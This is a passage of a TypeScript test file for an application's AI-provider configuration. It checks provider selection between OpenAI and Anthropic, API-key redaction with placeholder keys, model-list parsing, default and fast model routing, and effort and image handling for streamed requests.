    set({ OPENAI_API_KEY: KEY, ANTHROPIC_API_KEY: 'sk-ant-test-0000000000', NC_AI_PROVIDER: 'anthropic' });
    expect(config.providerId()).toBe('anthropic');
    set({ NC_AI_PROVIDER: 'none' });
    expect(client.aiConfigured()).toBe(false);
    set({ NC_AI_PROVIDER: 'openai', ANTHROPIC_API_KEY: undefined });
    expect(client.aiConfigured()).toBe(true);
    expect(typeof client.getClient().beta.messages.stream).toBe('function');
    set({ NC_AI_PROVIDER: 'openai-compatible' });
    expect(config.providerId()).toBe('openai');
    set({ OPENAI_BASE_URL: 'https://api.example.test/v1///' });
    expect(config.openaiConfig()).toMatchObject({ baseUrl: 'https://api.example.test/v1', apiKey: KEY });
    set({ OPENAI_BASE_URL: undefined });
    expect(config.openaiConfig()).toMatchObject({ baseUrl: 'https://api.openai.com/v1', apiKey: KEY });
  });

  it('redacts openai and Anthropic keys', () => {
    expect(config.scrub(`key ${KEY} other sk-test-abcdefghijkl and sk-proj-abcdefghijkl and sk-ant-api03-xxxxxxxxxxxx Bearer abcdefghijklmnopqrstuvwxyz`)).toBe('key [redacted] other sk-[redacted] and sk-proj-[redacted] and sk-ant-[redacted] Bearer [redacted]');
  });

  it('parses the standard OpenAI /models shape with useful defaults', () => {
    const parsed = openaiModels.parseOpenAIModels({ data: [
      { id: 'standard-first', object: 'model', created: 1, owned_by: 'openai' },
      { id: 'gpt-standard', object: 'model', created: 2, owned_by: 'openai' },
    ] });
    expect(parsed).toMatchObject([
      { slug: 'standard-first', displayName: 'standard-first', visibility: 'list', efforts: ['low', 'medium', 'high'], images: true },
      { slug: 'gpt-standard', displayName: 'gpt-standard', visibility: 'list', efforts: ['low', 'medium', 'high'], images: true },
    ]);
  });

  it('chooses the first gpt model by default and reports a missing-model configuration error', async () => {
    process.env.NC_AI_PROVIDER = 'openai';
    delete process.env.NC_AI_MODEL;
    openaiModels.setOpenAIModelsFetch((async () => new Response(JSON.stringify({ data: [
      { id: 'vendor-first', object: 'model', created: 1, owned_by: 'vendor' },
      { id: 'gpt-standard', object: 'model', created: 2, owned_by: 'openai' },
    ] }), { status: 200 })) as unknown as typeof fetch);
    await openaiModels.refreshOpenAIModels();
    models.syncModels();
    expect(models.DEFAULT_MODEL).toBe('gpt-standard');

    openaiModels.setOpenAIModelsFetch((async () => new Response(JSON.stringify({ data: [
      { id: 'vendor-first', object: 'model', created: 1, owned_by: 'vendor' },
      { id: 'vendor-second', object: 'model', created: 2, owned_by: 'vendor' },
    ] }), { status: 200 })) as unknown as typeof fetch);
    await openaiModels.refreshOpenAIModels();
    models.syncModels();
    expect(models.DEFAULT_MODEL).toBe('vendor-first');

    openaiModels.setOpenAIModelsFetch((async () => { throw new Error('offline'); }) as unknown as typeof fetch);
    await expect(openaiModels.refreshOpenAIModels()).resolves.toBeNull();
    models.syncModels();
    expect(models.modelConfigurationError()).toContain('NC_AI_MODEL');
    expect(() => client.getClient()).toThrow(/NC_AI_MODEL/);

    openaiModels.setOpenAIModelsFetch((async () => new Response(JSON.stringify(MODELS_JSON), { status: 200 })) as unknown as typeof fetch);
    process.env.NC_AI_MODEL = 'gpt-test-astra';
    await openaiModels.refreshOpenAIModels();
    models.syncModels();
  });

  it('lists openai models by display name, keeps NC_AI_MODEL as default and routes quick tasks to the fast model', async () => {
    process.env.NC_AI_PROVIDER = 'openai';
    process.env.NC_AI_MODEL = 'gpt-test-astra';
    await openaiModels.refreshOpenAIModels();
    const offered = models.offeredModels(false);
    expect(offered.map((m) => [m.id, m.name, m.group])).toEqual([
      ['gpt-test-sol', 'GPT-Test-Sol', 'recommended'], ['gpt-test-astra', 'GPT-Test-Astra', 'recommended'], ['gpt-test-luna', 'GPT-Test-Luna', 'recommended'], ['gpt-old-sol', 'GPT-Old-Sol', 'other'],
    ]);
    expect(models.DEFAULT_MODEL).toBe('gpt-test-astra');
    expect(models.modelLabel('gpt-test-astra')).toBe('GPT-Test-Astra');
    expect(models.resolveModel('auto')).toEqual({ model: 'gpt-test-astra', choice: 'auto', honored: true });
    expect(models.resolveModel('gpt-test-sol')).toEqual({ model: 'gpt-test-sol', choice: 'gpt-test-sol', honored: true });
    expect(models.resolveModel('claude-opus-5-5')).toMatchObject({ model: 'gpt-test-astra', honored: false });
    expect(models.fastModel()).toBe('gpt-test-luna');
    expect(models.requestModel({ effort: 'low', maxTokens: 2_000 })).toBe('gpt-test-luna');
    expect(models.requestModel({ effort: 'low', maxTokens: 32_000 })).toBe('gpt-test-astra');
    expect(models.requestModel({ effort: 'medium', maxTokens: 6_000 })).toBe('gpt-test-astra');
    expect(models.requestModel({ model: 'claude-opus-5-5', effort: 'low', maxTokens: 100 })).toBe('gpt-test-astra');
    expect(models.capabilities('gpt-test-astra')).toEqual({ fallback: false, dynamicWebTools: true });
    process.env.NC_AI_FAST_MODEL = 'gpt-test-reserve';
    expect(models.fastModel()).toBe('gpt-test-reserve');
    delete process.env.NC_AI_FAST_MODEL;
    // effort: nearest level the model supports; images off for text-only models
    expect(responses.nearestEffort('high', ['low', 'medium'])).toBe('medium');
    expect(responses.nearestEffort('medium', ['low', 'high'])).toBe('high');
    const seen: Seen[] = [];
    const f = fakeFetch([[created('gpt-test-luna'), ...message(0, ['A title']), completed()]], seen);
    const traits = (id: string) => { const m = models.modelInfo(id); return m ? { images: m.images, efforts: m.efforts } : undefined; };
    await client.runStream({ system: [{ type: 'text', text: 'You name chat conversations' }], messages: [{ role: 'user', content: 'Q' }], effort: 'high', maxTokens: 2_000 } as any, {}, { client: adapter(f, { modelTraits: traits }) });
    expect(seen[0].body).toMatchObject({ model: 'gpt-test-astra', reasoning: { effort: 'high' } });
    const g = fakeFetch([[created('gpt-test-luna'), ...message(0, ['A title']), completed()]], seen);
    await client.runStream({ system: [{ type: 'text', text: 'Title' }], messages: [{ role: 'user', content: [{ type: 'image', source: { type: 'base64', media_type: 'image/png', data: 'AAAA' } }, { type: 'text', text: 'Q' }] }], effort: 'low', maxTokens: 2_000 } as any, {}, { client: adapter(g, { modelTraits: traits }) });
    expect(seen[1].body.model).toBe('gpt-test-luna');
    expect(seen[1].body.input[0].content[0].type).toBe('input_text');
    // Anthropic keeps its Claude list
    process.env.NC_AI_PROVIDER = 'anthropic';
    process.env.ANTHROPIC_API_KEY = 'sk-ant-test-0000000000';
    delete process.env.NC_AI_MODEL;
    expect(models.offeredModels(false).map((m) => m.id)).toEqual(['claude-opus-5-5', 'claude-sonnet-5-5', 'claude-haiku-5-5', 'claude-opus-5']);
    expect(models.DEFAULT_MODEL).toBe('claude-opus-5-5');
    expect(models.requestModel({ effort: 'low', maxTokens: 2_000 })).toBe('claude-opus-5-5');
    expect(models.requestModel({ model: 'gpt-test-astra', effort: 'low', maxTokens: 2_000 })).toBe('claude-opus-5-5');
    expect(models.modelLabel('claude-opus-5-5')).toBe('Opus 5.5');
  });
});
